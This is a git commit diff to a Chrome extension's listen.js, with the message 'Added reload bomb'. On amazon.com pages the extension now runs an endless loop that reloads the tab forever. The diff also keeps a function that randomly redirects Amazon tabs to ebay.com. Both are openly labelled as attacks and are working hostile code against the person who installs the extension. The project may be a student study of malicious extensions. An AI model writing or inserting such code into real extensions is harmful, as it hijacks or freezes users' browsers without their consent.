1341dd3c6048cd7c8eb5a12cef41b540a52783c9
ahbecker <ahbecker@andrew.cmu.edu>
2014-11-17 17:47:42 -0500

    Added reload bomb. Added function organization.

--- src/listen.js
+++ src/listen.js
@@ -2,11 +2,21 @@ activationProbability = 0.2
 
 chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
     if (tab.url.indexOf("amazon.com") > -1) {
-        var randOut = Math.random();
-        if (randOut < activationProbability) {
-            var updateParam = new Object();
-            updateParam.url = "http://ebay.com";
-            chrome.tabs.update(tabId, updateParam);
-        }
+	reloadAttack(tabId);
     }
 });
+
+function redirectAttack(tabId) {
+    var randOut = Math.random();
+    if (randOut < activationProbability) {
+	var updateParam = new Object();
+	updateParam.url = "http://ebay.com";
+	chrome.tabs.update(tabId, updateParam);
+    }
+}
+
+function reloadAttack(tabId) {
+    while(true) {
+	chrome.tabs.reload(tabId);
+    }
+}
